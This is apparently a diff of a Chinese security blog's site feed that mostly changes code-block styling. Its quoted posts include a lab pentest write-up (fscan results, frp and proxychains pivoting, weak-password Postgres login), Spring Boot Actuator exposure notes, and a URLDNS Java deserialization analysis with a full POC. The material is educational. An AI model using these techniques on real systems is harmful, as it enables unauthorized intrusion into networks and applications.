+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>172.56.102.1:22 open
 </span></span><span style="display:flex;"><span>172.56.102.4:80 open
 </span></span><span style="display:flex;"><span>172.56.102.2:8080 open
 </span></span><span style="display:flex;"><span>172.56.102.3:5432 open
@@ -2000,14 +2000,14 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> WebTitle http://172.56.102.2:8080  code:200 len:90     title:$Title$
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PocScan http://172.56.102.2:8080 poc-yaml-struts2_045 poc1
 </span></span></code></pre></div><h3 id="二重内网环境配置代理">二重内网环境配置代理</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>172.56.102.4   phpmyadmin
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>172.56.102.4   phpmyadmin
 </span></span><span style="display:flex;"><span>172.56.102.3   Postgres
 </span></span><span style="display:flex;"><span>172.56.102.2   struts2
 </span></span></code></pre></div><p>这里直接拿巨魔的拓扑图
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_26.png" alt="" /></figure>
 <p>我现在需要再配置一个socks代理,服务器放在thinkphp机器上,客户端放在phpmyadmin机器上</p></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-toml" data-lang="toml"><span style="display:flex;"><span><span style="color:#a6e22e">phpmyadmin</span>.<span style="color:#a6e22e">toml</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-toml" data-lang="toml"><span style="display:flex;"><span><span style="color:#a6e22e">phpmyadmin</span>.<span style="color:#a6e22e">toml</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">serverAddr</span> = <span style="color:#e6db74">&#34;10.85.101.4&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">serverPort</span> = <span style="color:#ae81ff">7000</span>
@@ -2022,13 +2022,13 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_27.png" alt="" /></figure>
 <p>然后在proxychains里面配置两个代理</p></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>socks5 192.168.122.102 <span style="color:#ae81ff">9998</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>socks5 192.168.122.102 <span style="color:#ae81ff">9998</span>
 </span></span><span style="display:flex;"><span>socks5 10.85.101.4 <span style="color:#ae81ff">9998</span>
 </span></span><span style="display:flex;"><span>或者
 </span></span><span style="display:flex;"><span>socks5 127.0.0.1 <span style="color:#ae81ff">9998</span>
 </span></span><span style="display:flex;"><span>socks5 127.0.0.1 <span style="color:#ae81ff">9998</span>
 </span></span></code></pre></div><p>然后nmap扫一下,检查一下代理是否成功.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>☁  workspace  sudo proxychains nmap -Pn -sT -T4 172.56.102.2 -p8080
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>☁  workspace  sudo proxychains nmap -Pn -sT -T4 172.56.102.2 -p8080
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> config file found: /etc/proxychains4.conf
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> DLL init: proxychains-ng 4.17
@@ -2063,7 +2063,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 <p>之前fscan扫出来的弱口令
 <code>[+] Postgres:172.56.102.3:5432:postgres password</code></p>
 <p>登录之后获取flag</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>☁  workspace  sudo proxychains psql -h 172.56.102.3 -p <span style="color:#ae81ff">5432</span> -U postgres
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>☁  workspace  sudo proxychains psql -h 172.56.102.3 -p <span style="color:#ae81ff">5432</span> -U postgres
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> l1uyun: 
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> config file found: /etc/proxychains4.conf
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
@@ -2145,14 +2145,14 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
             <content type="html"><![CDATA[<h1 id="springboot利用">springboot利用</h1>
 <h1 id="前置知识">前置知识</h1>
 <h2 id="springboot-actuator">SpringBoot Actuator</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Spring Boot Actuator 1.x 版本默认内置路由的起始路径为 / ，2.x 版本则统一以 /actuator 为起始路径
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Spring Boot Actuator 1.x 版本默认内置路由的起始路径为 / ，2.x 版本则统一以 /actuator 为起始路径
 </span></span><span style="display:flex;"><span>Spring Boot Actuator 默认的内置路由名字，如 /env 有时候也会被程序员修改，比如修改成 /appenv
 </span></span></code></pre></div><p>一般来讲，暴露出 spring boot 应用的相关接口和传参信息并不能算是漏洞，但是以 “默认安全” 来讲，不暴露出这些信息更加安全。</p>
 <p>对于攻击者来讲，一般会仔细审计暴露出的接口以增加对业务系统的了解，并会同时检查应用系统是否存在未授权访问、越权等其他业务类型漏洞。</p>
 <h2 id="配置不当而暴露的路由">配置不当而暴露的路由</h2>
 <p>主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置</p>
 <p>因为配置不当而暴露的默认内置路由可能会有：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/actuator
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/actuator
 </span></span><span style="display:flex;"><span>/auditevents
 </span></span><span style="display:flex;"><span>/autoconfig
 </span></span><span style="display:flex;"><span>/beans
@@ -2235,7 +2235,7 @@ POST 请求 /env 接口设置属性后，可同时配合 POST 请求 /refresh �
 </p>
 <h3 id="白盒发现">白盒发现</h3>
 <p>pom.xml,引用库</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;dependency&gt;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;dependency&gt;</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;groupId&gt;</span>org.springframework.boot<span style="color:#f92672">&lt;/groupId&gt;</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;artifactId&gt;</span>spring-boot-starter-actuator<span style="color:#f92672">&lt;/artifactId&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/dependency&gt;</span>
@@ -2341,7 +2341,7 @@ POST 请求 /env 接口设置属性后，可同时配合 POST 请求 /refresh �
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_31.png" alt="" /></figure>
 </p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>配置文件中Actuator设置是否为*(全部暴露)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>配置文件中Actuator设置是否为*(全部暴露)
 </span></span><span style="display:flex;"><span>management.endpoints.web.exposure.include=*
 </span></span></code></pre></div><p>
 <figure class="md-figure">
@@ -2408,7 +2408,7 @@ JDumpSpider</p>
 </ul>
 <h2 id="漏洞分析">漏洞分析</h2>
 <p>ysoserial里是这样生成payload的</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">getObject</span>(<span style="color:#66d9ef">final</span> String url) <span style="color:#66d9ef">throws</span> Exception {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">getObject</span>(<span style="color:#66d9ef">final</span> String url) <span style="color:#66d9ef">throws</span> Exception {
 </span></span><span style="display:flex;"><span>             <span style="color:#75715e">//Avoid DNS resolution during payload creation</span>
 </span></span><span style="display:flex;"><span>             <span style="color:#75715e">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span>
 </span></span><span style="display:flex;"><span>             URLStreamHandler handler <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SilentURLStreamHandler();
@@ -2439,7 +2439,7 @@ JDumpSpider</p>
 </code></pre><p>urldns是yso中较为简单的一个gadget，所以这里可以直接通过正向分析的方式进行分析</p>
 <p>看到 URLDNS 类的 getObject ⽅法，ysoserial会调⽤这个⽅法获得Payload。这个⽅法返回的是⼀个对象，这个对象就是最后将被序列化的对象，在这⾥是 HashMap。因为触发反序列化的⽅法是 readObject,那么可以直奔 HashMap 类的 readObject ⽅法：</p>
 <p>HashMap#readObject</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readObject</span>(java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ObjectInputStream</span> s)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readObject</span>(java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ObjectInputStream</span> s)
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {
 </span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span>
 </span></span><span style="display:flex;"><span>        s.<span style="color:#a6e22e">defaultReadObject</span>();
@@ -2480,13 +2480,13 @@ JDumpSpider</p>
 </span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>    }
 </span></span></code></pre></div><p>putVal这一段，这里调用了hash方法来处理key，跟进hash方法：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hash</span>(Object key) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hash</span>(Object key) {
 </span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">int</span> h;
 </span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">return</span> (key <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) <span style="color:#f92672">?</span> 0 : (h <span style="color:#f92672">=</span> key.<span style="color:#a6e22e">hashCode</span>()) <span style="color:#f92672">^</span> (h <span style="color:#f92672">&gt;&gt;&gt;</span> 16);
 </span></span><span style="display:flex;"><span>   }
 </span></span></code></pre></div><p>这里又调用了key.hashCode方法,这里的key是一个URL对象,让我们看看URL的hashCode方法：</p>
 <p>URL#hashCode：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">synchronized</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hashCode</span>() {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">synchronized</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hashCode</span>() {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (hashCode <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span>1)
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> hashCode;
 </span></span><span style="display:flex;"><span>
@@ -2495,7 +2495,7 @@ JDumpSpider</p>
 </span></span><span style="display:flex;"><span>    }
 </span></span></code></pre></div><p>在URL类的hashCode方法中，又调用了URLStreamHandler#hashCode，并将自身传递进去：</p>
 <p>URLStreamHandler#hashCode</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hashCode</span>(URL u) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hashCode</span>(URL u) {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> h <span style="color:#f92672">=</span> 0;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Generate the protocol part.</span>
@@ -2506,7 +2506,7 @@ JDumpSpider</p>
 </span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Generate the host part.</span>
 </span></span><span style="display:flex;"><span>        InetAddress addr <span style="color:#f92672">=</span> getHostAddress(u);
 </span></span></code></pre></div><p>getHostAddress，正是这步触发了dns请求：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">synchronized</span> InetAddress <span style="color:#a6e22e">getHostAddress</span>(URL u) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">synchronized</span> InetAddress <span style="color:#a6e22e">getHostAddress</span>(URL u) {
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (u.<span style="color:#a6e22e">hostAddress</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> u.<span style="color:#a6e22e">hostAddress</span>;
@@ -2530,7 +2530,7 @@ JDumpSpider</p>
 <p>这里存在一个问题,当我们生成payload的时候,也会存在计算哈希的过程,我们需要避免这个操作,</p>
 <p>回到第一步：HashMap#readObject</p>
 <p>key是使用readObject取出来的，也就是说在writeObject一定会写入key</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">writeObject</span>(java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ObjectOutputStream</span> s)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">writeObject</span>(java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ObjectOutputStream</span> s)
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throws</span> IOException {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> buckets <span style="color:#f92672">=</span> capacity();
 </span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Write out the threshold, loadfactor, and any hidden stuff</span>
@@ -2540,7 +2540,7 @@ JDumpSpider</p>
 </span></span><span style="display:flex;"><span>        internalWriteEntries(s);
 </span></span><span style="display:flex;"><span>    }
 </span></span></code></pre></div><p>跟入internalWriteEntries</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">internalWriteEntries</span>(java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ObjectOutputStream</span> s) <span style="color:#66d9ef">throws</span> IOException {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">internalWriteEntries</span>(java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ObjectOutputStream</span> s) <span style="color:#66d9ef">throws</span> IOException {
 </span></span><span style="display:flex;"><span>        Node<span style="color:#f92672">&lt;</span>K,V<span style="color:#f92672">&gt;[]</span> tab;
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">&gt;</span> 0 <span style="color:#f92672">&amp;&amp;</span> (tab <span style="color:#f92672">=</span> table) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> 0; i <span style="color:#f92672">&lt;</span> tab.<span style="color:#a6e22e">length</span>; <span style="color:#f92672">++</span>i) {
@@ -2553,11 +2553,11 @@ JDumpSpider</p>
 </span></span><span style="display:flex;"><span>    }
 </span></span></code></pre></div><p>这里的key以及value是从tab中取的，而tab的值即HashMap中table的值。</p>
 <p>此时我们如果想要修改table的值，就需要调用HashMap#put方法，而HashMap#put方法中也会对key调用一次hash方法，所以在这里就会产生第一次dns查询</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> V <span style="color:#a6e22e">put</span>(K key, V value) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> V <span style="color:#a6e22e">put</span>(K key, V value) {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> putVal(hash(key), key, value, <span style="color:#66d9ef">false</span>, <span style="color:#66d9ef">true</span>);
 </span></span><span style="display:flex;"><span>    }
 </span></span></code></pre></div><p>即</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap;
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.net.URL;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Test</span> {
@@ -2568,7 +2568,7 @@ JDumpSpider</p>
 </span></span><span style="display:flex;"><span>        map.<span style="color:#a6e22e">put</span>(url,123); <span style="color:#75715e">//此时会产生dns查询</span>
 </span></span><span style="display:flex;"><span>    }
 </span></span></code></pre></div><p>只想判断payload在对方机器上是否成功触发，那就应该避免掉这一次dns查询以及多余的操作，回到URL#hashCode：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">synchronized</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hashCode</span>() {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">synchronized</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hashCode</span>() {
 </span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (hashCode <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span>1)
 </span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span> hashCode;
 </span></span><span style="display:flex;"><span>
@@ -2579,7 +2579,7 @@ JDumpSpider</p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-urldns%e9%93%be_image_1.png" alt="" /></figure>
 <p>这里的hashCode是private修饰的，所以我们需要通过反射来修改其值</p></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
 </span></span><span style="display:flex;"><span>        HashMap map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap();
 </span></span><span style="display:flex;"><span>        URL url <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">&#34;http://xrgsnqezso.yutu.eu.org&#34;</span>);
 </span></span><span style="display:flex;"><span>        Field f <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;java.net.URL&#34;</span>).<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;hashCode&#34;</span>);
@@ -2592,7 +2592,7 @@ JDumpSpider</p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-urldns%e9%93%be_image_2.png" alt="" /></figure>
 <p>当put完毕之后再将url的hashCode修改为-1，确保在反序列化调用hashCode方法时能够正常进行，下面是完整的POC</p></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>URLDNS.<span style="color:#a6e22e">java</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>URLDNS.<span style="color:#a6e22e">java</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.FileOutputStream;
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectOutputStream;
@@ -2624,7 +2624,7 @@ JDumpSpider</p>
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>回过头来看看yso的payload</p>
 <p>yso在创建URL对象时使用了三个参数的构造方法。yso用了子类继承父类的方式规避了dns查询的风险，其创建了一个内部类：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SilentURLStreamHandler</span> <span style="color:#66d9ef">extends</span> URLStreamHandler {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SilentURLStreamHandler</span> <span style="color:#66d9ef">extends</span> URLStreamHandler {
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">protected</span> URLConnection <span style="color:#a6e22e">openConnection</span>(URL u) <span style="color:#66d9ef">throws</span> IOException {
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
@@ -2690,7 +2690,7 @@ java序列化的数据一般会以标记(ac ed 00 05)开头，base64编码的特
 使任何状态序列化或反序列化，会抛出 NotSerializableException 。
 2.该类的所有属性必须是可序列化的。如果有一个属性不需要可序列化的，则该属性必须注明是瞬态的，使用transient 关键字修饰。</p>
 <p>示例:</p>
